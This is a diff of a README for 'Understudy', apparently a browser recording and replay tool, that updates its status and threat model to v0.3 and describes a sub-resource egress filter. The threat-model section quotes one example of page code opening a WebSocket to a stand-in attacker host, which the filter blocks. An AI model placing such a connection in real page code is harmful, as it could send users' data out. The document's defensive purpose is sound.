@@ -15,7 +15,7 @@
   <img alt="status" src="https://img.shields.io/badge/status-alpha-orange">
 </p>
 
-> **Status: v0.2.** Browser capture, recipe induction, replay, and the editable memory-graph UI all ship in v0.2 &mdash; see [Status](#status). Next up: sub-resource egress filter, prompt-injection classifier, and a published eval pass-rate.
+> **Status: v0.3.** Browser capture, recipe induction, replay, the editable memory-graph UI, and the sub-resource egress filter all ship &mdash; see [Status](#status). Next up: prompt-injection classifier and a nightly real-site pass-rate badge.
 
 ---
 
@@ -127,7 +127,7 @@ uv run understudy doctor
 
 ## Threat model & limitations
 
-> **Threat model version:** v0.1, last reviewed 2026-04-13.
+> **Threat model version:** v0.3, last reviewed 2026-04-13.
 
 Understudy is accessibility software with the same blast radius as a remote-control utility. Treat it accordingly.
 
@@ -151,9 +151,9 @@ Local process ↔ Anthropic API ↔ disk ↔ user.
 | API-side logging | No screen frames or trajectories sent to anything other than the configured Anthropic endpoint. |
 | Accidental capture of secrets | Default deny-list of password managers, banks, OAuth providers, payment processors, and cloud consoles. URL parser hardened against userinfo, IDNA, and IP-literal bypasses. Regex redaction on every captured value. |
 
-### Explicit non-goals / residual risk in v0.1
+### Explicit non-goals / residual risk in v0.3
 
-- **Replay v0.3 closes the sub-resource egress gap** via `ctx.route("**/*", ...)` keyed on the origins captured during the original recording (persisted in `<trajectory-id>.meta.json` and copied into `Recipe.allowed_origins`). Documents, images, scripts, stylesheets, XHR/fetch, media, and fonts to any host not in the allowlist are blocked at the route handler and logged. `file://` is always denied; `data:` URIs for `document`/`script` are refused regardless of size. WebSockets to non-allowlisted hosts are observed and logged (Playwright's `route()` does not cover the WS upgrade, so hard-abort of an open WebSocket is not yet implemented). The v0.1 top-frame drift check is still in place as belt-and-suspenders.
+- **Replay v0.3 closes the sub-resource egress gap** via `ctx.route("**/*", ...)` keyed on the origins captured during the original recording (persisted in `<trajectory-id>.meta.json` and copied into `Recipe.allowed_origins`). Documents, images, scripts, stylesheets, XHR/fetch, media, and fonts to any host not in the allowlist are blocked at the route handler and logged. `file://` is always denied; `data:` URIs for `document`/`script` are refused regardless of size. WebSockets are denied via an in-page `window.WebSocket` wrapper installed as an init script — page code attempting `new WebSocket("wss://attacker.tld/...")` receives a `SecurityError`. The `page.on("websocket")` observer logs anything that slips past the wrapper (e.g., browser-internal connections). The v0.1 top-frame drift check is still in place as belt-and-suspenders.
 - **Authentication replay is out of scope for v0.1.** The replay engine launches a fresh, unauthenticated browser context. Recipes that depend on a logged-in session will land on the site's login wall on step 1. Persistent-storage replay is planned.
 - **Step-level HITL uses an intent-regex**, operating on the LLM-induced description of a step. A miscategorised intent bypasses the heartbeat/destructive-verb rule. The recipe's explicit `requires_confirmation: true` flag (set by induction or hand-edit) is the authoritative gate.
 - **HITL default is deny-on-Enter**: bare Enter does NOT approve. You must type `y` to approve, `a` to abort, anything else denies. Auto-deny at 10s when no response.
